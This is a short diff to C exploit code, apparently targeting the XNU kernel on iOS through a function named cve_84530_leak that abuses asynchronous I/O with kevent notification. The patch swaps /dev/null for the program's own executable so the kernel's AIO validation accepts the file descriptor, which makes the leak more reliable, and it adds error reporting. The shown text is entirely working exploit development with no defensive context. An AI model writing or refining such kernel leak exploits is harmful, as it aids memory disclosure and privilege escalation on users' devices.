@@ -10,6 +10,7 @@
 #include <signal.h>
 #include <errno.h>
 #include <pthread.h>
+#include <mach-o/dyld.h>
 
 #define SIGEV_KEVENT             3
 #define EVFILT_AIO_VAL           ((int16_t)(-3))
@@ -74,9 +75,16 @@ uint64_t cve_84530_leak(void) {
         return 0;
     }
 
-    int fd = open("/dev/null", O_RDONLY);
+    /* Use own executable — guaranteed regular file, AIO-safe on iOS */
+    /* /dev/null is a chardev; XNU aio_validate rejects non-vnodes */
+    char exepath[1024];
+    uint32_t exepathsz = sizeof(exepath);
+    if (_NSGetExecutablePath(exepath, &exepathsz) != 0)
+        strlcpy(exepath, "/usr/lib/libSystem.B.dylib", sizeof(exepath));
+    int fd = open(exepath, O_RDONLY);
     if (fd < 0) {
-        snprintf(g_result, sizeof(g_result), "open() failed: %d", fd);
+        snprintf(g_result, sizeof(g_result),
+            "open(%s) failed: %d errno=%d", exepath, fd, errno);
         return 0;
     }
 
